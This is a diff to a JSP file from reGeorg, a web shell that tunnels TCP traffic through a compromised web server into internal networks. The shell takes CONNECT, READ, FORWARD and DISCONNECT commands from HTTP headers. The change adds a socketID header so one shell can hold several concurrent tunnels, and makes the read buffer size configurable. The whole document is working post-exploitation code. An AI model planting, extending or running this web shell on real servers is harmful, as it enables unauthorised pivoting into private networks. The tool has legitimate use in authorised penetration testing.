@@ -26,6 +26,7 @@ https://github.com/sensepost/reGeorg
 
 */%><%@page import="java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket" trimDirectiveWhitespaces="true"%><%
     String cmd = request.getHeader("X-CMD");
+    String socketID = request.getHeader("socketID");
     if (cmd != null) {
         response.setHeader("X-STATUS", "OK");
         if (cmd.compareTo("CONNECT") == 0) {
@@ -35,7 +36,11 @@ https://github.com/sensepost/reGeorg
                 SocketChannel socketChannel = SocketChannel.open();
                 socketChannel.connect(new InetSocketAddress(target, port));
                 socketChannel.configureBlocking(false);
-                session.setAttribute("socket", socketChannel);
+                if (socketID != null) {
+                    session.setAttribute(socketID+"socket", socketChannel);
+                } else {
+                    session.setAttribute("socket", socketChannel);
+                }
                 response.setHeader("X-STATUS", "OK");
             } catch (UnknownHostException e) {
                 System.out.println(e.getMessage());
@@ -48,17 +53,32 @@ https://github.com/sensepost/reGeorg
                 
             }
         } else if (cmd.compareTo("DISCONNECT") == 0) {
-            SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket");
+            SocketChannel socketChannel;
+            if (socketID != null) {
+                socketChannel = (SocketChannel)session.getAttribute(socketID+"socket");
+            } else {
+                socketChannel = (SocketChannel)session.getAttribute("socket");
+            }
             try{
                 socketChannel.socket().close();
             } catch (Exception ex) {
                 System.out.println(ex.getMessage());
             }
-            session.invalidate();
+            if (socketID != null) {
+                session.removeAttribute(socketID+"socket");
+            } else {
+                session.invalidate();
+            }
         } else if (cmd.compareTo("READ") == 0){
-            SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket");
-            try {            
-                ByteBuffer buf = ByteBuffer.allocate(512);
+            SocketChannel socketChannel;
+            if (socketID != null) {
+                socketChannel = (SocketChannel)session.getAttribute(socketID+"socket");
+            } else {
+                socketChannel = (SocketChannel)session.getAttribute("socket");
+            }
+            try {
+                int bufSize = Integer.parseInt(request.getHeader("Bufsize"));
+                ByteBuffer buf = ByteBuffer.allocate(bufSize);
                 int bytesRead = socketChannel.read(buf);
                 ServletOutputStream so = response.getOutputStream();
                 while (bytesRead > 0){
@@ -79,7 +99,12 @@ https://github.com/sensepost/reGeorg
             }        
             
         } else if (cmd.compareTo("FORWARD") == 0){
-            SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket");
+            SocketChannel socketChannel;
+            if (socketID != null) {
+                socketChannel = (SocketChannel)session.getAttribute(socketID+"socket");
+            } else {
+                socketChannel = (SocketChannel)session.getAttribute("socket");
+            }
             try {
                 
                 int readlen = request.getContentLength();
@@ -106,6 +131,6 @@ https://github.com/sensepost/reGeorg
         } 
     } else {
         //PrintWriter o = response.getWriter();  
-        out.print("Georg says, 'All seems fine'");  
+        out.print("Georg says, 'All seems fine'");
     }
 %>
